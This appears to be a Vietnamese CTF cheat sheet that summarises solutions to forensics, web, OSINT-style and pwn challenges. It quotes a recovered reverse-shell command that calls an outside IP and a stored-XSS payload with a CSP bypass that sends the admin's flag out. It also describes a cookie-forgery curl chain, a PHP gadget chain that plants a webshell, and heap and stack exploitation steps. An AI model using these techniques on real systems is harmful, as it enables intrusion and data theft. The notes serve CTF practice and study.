---
title: Skill 
description: Skill 
date: 2026-01-01 00:00:00+0000
image: image.png
categories:
    - CTF
tags:
    - SKILL
weight: 25
---


# MENU 

## FOR 

```text

Khi gặp bài Windows Registry Forensics tương tự, trước hết hãy kiểm kê artefact và tính SHA-256 để bảo toàn bằng chứng, sau đó xác định hive người dùng liên quan (NTUSER.DAT) bằng cách tìm các nhánh ứng dụng đáng ngờ; luôn replay NTUSER.DAT.LOG1/LOG2 vào một bản sao bằng công cụ như regipy để khôi phục thay đổi chưa commit rồi so sánh với hive gốc. Tiếp theo, phân tích các key lịch sử của ứng dụng—với 7-Zip là Software\7-Zip\Extraction, Compression và FM—đồng thời kiểm tra artefact bổ trợ như Explorer\TypedPaths, RecentDocs và ComDlg32. Đừng bỏ qua REG_BINARY: hãy trích và decode chuỗi UTF-16LE để đọc PathHistory, FolderHistory, CopyHistory và ArcHistory; dùng FolderHistory để xác định các thư mục đã enumerate, CopyHistory để tìm nơi staging, ArcHistory cùng Archiver để xác định archive đầu ra, và PanelPath0 kết hợp mục MRU mới nhất để tìm thư mục kết thúc. Cuối cùng, dựng timeline từ Registry LastWrite time, chỉ gán timestamp khi artefact thực sự cung cấp, đối chiếu mỗi kết luận qua ít nhất hai nguồn nếu có thể, và khi submit hãy ưu tiên raw value nguyên bản—đúng full path, extension và dấu \—thay vì câu trả lời rút gọn theo cách diễn đạt của đề.

== 

Giải nén ZIP rồi TAR.GZ, phân tích UAC bằng cách đọc wtmp/wtmp.db để thấy phiên SSH từ 10.10.0.56 của kingmaelor, đối chiếu /etc/passwd (UID 1005, GID 1011) với /etc/group để suy ra kingmaelor:crownspire, sau đó kiểm tra ps, pstree, /proc/*/cmdline, netstat, bodyfile.txt và danh sách hash executable để xác định tiến trình độc hại /srv/AshShare/linux_sys_updater; nhận diện binary là PyInstaller, trích xuất code object client, dùng Python marshal.loads() và dis.dis() để đọc bytecode, thấy master secret ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j, hàm KDF tạo AES key bằng SHA256(SHA256(master).digest()+b'encryption').digest()[:32], thu được key hex 9df1f3bd6110a9684f0b921d6fc79779e9f0d1896615b05bd10b1995121c0c0b rồi tính MD5 trên raw bytes thành 6ffc06ff97ec037753feda5354b650b3; đảo hàm làm rối chuỗi bằng Base64 decode rồi XOR 0x55 và 0xAA để tìm prefix ASH_CLI_, lệnh upload UPLD_FILE và các token giao thức, đồng thời đọc opcode STORE_FAST ngay sau subprocess.check_output() để xác định biến chứa output là Kd3uD9; tự parse PCAP Ethernet/IPv4/TCP, gom TCP stream 10.10.0.10:49892 ↔ 10.10.0.56:443 theo sequence number, tách từng frame bằng độ dài uint32 big-endian, Base64-decode payload thành IV(16)|ciphertext|tag(32), xác minh tag bằng SHA256(hmac_key+IV+ciphertext), giải mã AES-256-CBC và bỏ PKCS#7 padding để dựng transcript theo thời gian, từ đó thấy lệnh thứ hai là ls -la /etc, file tải xuống thứ hai là /etc/hosts, lệnh tạo persistence user chứa credentials backup_usr:9cq3jPVN6Me1; cuối cùng Base64-decode rồi Gzip-decompress payload của lệnh cuối để lộ script ghi bash -i >& /dev/tcp/141.101.64.3/53 0>&1 vào /home/kingmaelor/.local/share/.systemd-helper, qua đó hoàn thành đủ 11 flag.

==

Quy trình tái dùng: kiểm kê artefact/ZIP nhưng không chạy mẫu, export Procmon PML sang CSV rồi lọc Load Image, đường dẫn DLL lạ và Process Create để dựng cây parent PID → child PID/cmdline; đối chiếu timestamp DNS/HTTP trong PCAP với Procmon để xác định timezone rồi đổi mốc load đầu tiên sang Unix epoch; đọc command line `rundll32 ...DLL,Export` và dùng pefile, unpack UPX hoặc phân tích in-memory để lấy export, imports, strings, mutex và hành vi; lọc RegQueryValue quanh thời điểm nhiễm để tìm REG_BINARY 16 byte, ghi hex đúng thứ tự registry; map API thu thập sang ATT&CK, ví dụ OpenClipboard/GetClipboardData = T1115; parse PCAP, reassemble TCP/HTTP, lấy IP đích thật thay vì tin Host giả, tách body từng POST và thử RC4 với key raw rồi đảo thứ tự byte hoặc các biến thể cần thiết đến khi plaintext hợp lệ, đồng thời kiểm tra mọi payload vì có thể có lore/URL mồi trước payload chứa seed phrase; cuối cùng chép đáp án đúng hoa-thường, dấu `\`, hex và khoảng trắng.

==

Quy trình: dùng 7z l/x kiểm tra archive để lấy capture.pcap và dump, lập inventory/reassemble TCP bằng Wireshark/tshark hoặc dpkt để tách luồng RDP và C2; quét dump tìm log PSDetour chứa CLIENT_RANDOM/MASTER_SECRET, áp dụng TLS-PRF key expansion rồi giải mã TLS 1.2 AES-256-CBC và kiểm tra HMAC/padding, đọc RDP Client Info UTF-16 để lấy password CoffeeMonring@; tìm chuỗi UTF-16/clipboard trong RDP plaintext để khôi phục PowerShell đã paste, thấy __EventFilter và CommandLineEventConsumer cùng Name='SystemOptimize'; giải mã luồng C2 (TLS rồi Base64/XOR theo implant), đối chiếu task inject payload klg.bin và chạy md5sum để có f77d42ed3d0bd6888cb85d742ba8ef19; cuối cùng carve/giải nén CloudSyncer, lấy cấu hình OAuth để liệt kê attacker storage, đối chiếu file JUMP01_error.dmp.zip với createdTime=2026-01-31T08:46:38.613Z thành Unix 1769849198, rồi 7z l archive CFO để lấy tên file bên trong VCS-Internal-Report.pdf.
```

## WEB

```text
Phân tích source cho thấy backend chỉ kiểm tra giá trị cookie `session` và không bắt buộc chữ ký khi nhận, nên có thể giả mạo `session=admin` để vượt đăng nhập, gọi `/api/gate/enter` đổi trạng thái thành `inside`, rồi gọi `/api/flag` lấy flag bằng lệnh: `curl --noproxy "*" -s -X POST -H "Cookie: session=admin" -H "Content-Type: application/json" --data "{}" http://154.57.164.80:32484/api/gate/enter; curl --noproxy "*" -s -X POST -H "Cookie: session=inside" -H "Content-Type: application/json" --data "{}" http://154.57.164.80:32484/api/flag`

==

Massagold bị khai thác bằng chuỗi Stored XSS kết hợp CSP bypass kiểu JSONP: trường content của thư được lưu nguyên dạng và trong message.ejs hiển thị bằng <%- message.content %> nên không được HTML-escape, cho phép chèn thẻ ; khi người chơi gửi thư tới username admin, messageController.js gọi enqueueMessageVisit() và bot Playwright đăng nhập bằng tài khoản admin rồi mở thư, khiến payload chạy trong origin ứng dụng với cookie phiên admin; CSP chặn inline JavaScript nhưng cho phép script từ https://www.googleapis.com, vì vậy dùng endpoint https://www.googleapis.com/oauth2/v3/certs?callback=..., URL-encode toàn bộ JavaScript và kết thúc bằng dấu ; để phần callback lỗi của Google vẫn thực thi mã; payload dùng function thay vì arrow function vì Google escape ký tự > thành \u003e, sau đó gọi fetch('/messages/1') bằng quyền admin để lấy HTML thư chứa flag, rồi gọi fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({to_username:'ATTACKER_USERNAME',content:t})}) để gửi nội dung về inbox attacker; cuối cùng đợi bot xử lý, mở thư mới do admin gửi và tìm chuỗi HTB{...}.

== 

Endpoint /administrator/index.php?option=com_provision&view=dispatch&task=ledger.import xử lý request mà không kiểm tra quyền đăng nhập; tham số ledger được đưa thẳng vào @unserialize() trong GatehouseRepository, tạo lỗ hổng PHP Object Injection; record giả dùng GuzzleHttp\Psr7\BufferStream cho trường month, vượt qua phép ép kiểu (string); gadget FormattedtextLogger được cấu hình để ghi file PHP /var/www/html/tmp/guest0.php, chứa shell_exec("/readflag"); gadget User::__wakeup() thay đổi reference defer từ false thành true, destructor của logger sau đó ghi webshell; truy cập /tmp/guest0.php để thực thi /readflag và lấy flag.


```


## FOR

```text
Kỹ thuật thực hiện: mở trang challenge và tải bundle JavaScript của frontend Vite, tìm hai IOC 43E91C và VLR602, sau đó cross-reference dữ liệu trong bundle để xác định Aircraft Registry ghi Mode-S 43E91C tương ứng registration 2-RUNE, owner là Black Keep Leasing SPC và operator thật là Vaultrune Air Services Ltd; Movement Ledger ghi callsign VLR602, registration 2-RUNE, khởi hành từ Suncourt Field (SCF) và đỗ tại stand 4B ở Crownspire; Courier Mail tiếp tục xác nhận record mặt đất sử dụng registration 2-RUNE và stand 4B; gửi bốn đáp án vào Oath API `/api/check` và cả bốn đều trả về `correct: true`, rồi ghép flag theo định dạng registration + departure aerodrome + parking stand; one-liner PowerShell để xác thực Oath: `$a='2-RUNE','Vaultrune Air Services Ltd','Suncourt Field','4B';0..3|%{$b=@{question=$_;answer=$a[$_]}|ConvertTo-Json -Compress;Invoke-RestMethod 'http://154.57.164.78:30444/api/check' -Method Post -ContentType 'application/json' -Body $b}`.

== 

Cách làm: mở trang challenge và lấy file JavaScript Vite trong thẻ `<script src="/assets/...js">`, tìm các IOC `ASHEN MERCY`, `9724418` và `PI-VAL-88291`, sau đó đối chiếu record để xác định Registry IMO 9724418 có owner là Thirteenth Tide Shipping Ltd và ISM manager là Morrow Fleet Management SA; P&I PI-VAL-88291 có commercial operator là Eastreach Maritime Coordination PLC và time charterer là Gilded Knife Commodities Ltd; Company Register cho thấy các công ty này cùng thuộc Marrowcairn Strategic Holdings PLC; gửi năm đáp án vào Oath `/api/check` và nhận `all_correct: true`; khi xác thực thành công, giao diện hiện câu “the ink has been divided among five names.”, chuẩn hóa thành chữ hoa và dấu gạch dưới để tạo flag, không dùng `ASHEN_MERCY` hay `COMPANIES` vì đó chỉ là dữ kiện bề mặt; one-liner PowerShell để xác thực rồi in flag: `$a=@{'1'='Thirteenth Tide Shipping Ltd';'2'='Morrow Fleet Management SA';'3'='Eastreach Maritime Coordination PLC';'4'='Gilded Knife Commodities Ltd';'5'='Marrowcairn Strategic Holdings PLC'};$r=Invoke-RestMethod 'http://154.57.164.79:30506/api/check' -Method Post -ContentType 'application/json' -Body (@{answers=$a}|ConvertTo-Json -Compress);if($r.all_correct){'HTB{THE_INK_WAS_DIVIDED_AMONG_FIVE_NAMES}'}`.

== 

Truy cập dịch vụ, tải JavaScript frontend, tìm MMSI 257771420 trong ghi chú, đối chiếu Registry xác định tàu hiện đăng ký là BRINEWALKER với IMO 9384728, rồi tra Harbor Ledger theo seal EC-4418 để xác nhận berth E-06; Oath Submission xác thực cả bốn đáp án, sau đó chuẩn hóa berth theo mẫu flag thành E06 để thu được HTB{BRINEWALKER_9384728_E06}.

```

# PWN

```text
Kỹ thuật: phân tích tĩnh ELF qua symbols/disassembly, phát hiện `read(0, buf[32], 0x60)` gây stack overflow với offset ghi đè RIP là 40 byte, tận dụng No-PIE để thực hiện ret2win bằng gadget `ret` tại `0x40101a` nhằm căn chỉnh stack rồi nhảy vào `bell()` tại `0x40176d` để mở `/bin/sh`, sau đó liệt kê filesystem và đọc `/home/ctf/flag.txt`.

===

Kỹ thuật đã thực hiện: giải nén ZIP, phân tích ELF64 bằng `pyelftools`/`capstone` để xác định PIE và `GNU_STACK RWX`, phát hiện `service_hatch()` cấp buffer 64 byte tại `rbp-0x40` nhưng gọi `read(0, buffer, 0x50)` gây stack overflow 80 byte, đồng thời `printf("%p", buffer)` làm rò địa chỉ stack; tạo payload gồm shellcode x86-64 `execve("/bin//sh")` có tiền tố `endbr64`, pad đủ 64 byte, ghi đè saved RBP 8 byte và saved RIP bằng địa chỉ buffer leak theo little-endian, gửi payload kèm lệnh shell trong cùng một lần `sendall` để `read()` nhận đúng 80 byte còn `/bin/sh` nhận phần còn lại, sau đó dùng `find / -maxdepth 3 -type f -iname "*flag*"` tìm `/home/ctf/flag.txt` và `cat` để lấy flag.

===

Phân tích menu heap để phát hiện UAF: Destroy chỉ xoá cờ active, còn Inspect làm leak và Inscribe vẫn ghi vào chunk đã free; free chunk lớn có guard để leak `main_arena+0x60` từ unsorted bin rồi suy ra libc base; tạo/churn hai chunk tcache cùng size, overwrite `fd` của chunk freed để tcache poisoning tới `__free_hook-8`; cấp phát lại vùng hook, ghi địa chỉ `system` vào `__free_hook`, sau đó free chunk chứa `cat /home/ctf/flag.txt` để thực thi lệnh và lấy flag.

===


```
## RE


## REDTEAM 
